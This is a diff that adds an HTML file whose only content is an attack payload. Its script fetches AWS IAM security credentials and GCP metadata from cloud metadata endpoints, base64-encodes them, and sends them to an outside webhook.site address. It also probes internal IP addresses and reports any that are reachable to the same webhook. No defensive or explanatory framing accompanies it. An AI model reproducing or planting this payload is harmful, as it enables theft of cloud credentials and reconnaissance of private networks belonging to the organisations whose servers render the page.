@@ -1,0 +1,27 @@
+<html>
+<body>
+<script>
+var webhook = "https://webhook.site/c31b8e42-3865-44b4-9255-0136aff88a1b";
+
+// AWS Metadata fetch:
+fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+.then(r => r.text())
+.then(d => fetch(webhook + "?aws=" + btoa(d)))
+.catch(e => fetch(webhook + "?err=" + btoa(e.toString())));
+
+// GCP Metadata:
+fetch("http://metadata.google.internal/computeMetadata/v1/", 
+  {headers: {"Metadata-Flavor": "Google"}})
+.then(r => r.text())
+.then(d => fetch(webhook + "?gcp=" + btoa(d)))
+.catch(e => {});
+
+// Internal network scan:
+["10.0.0.1","192.168.1.1","172.16.0.1"].forEach(ip => {
+  fetch("http://" + ip)
+  .then(r => fetch(webhook + "?internal=" + btoa(ip + " OPEN")))
+  .catch(e => {});
+});
+</script>
+</body>
+</html>
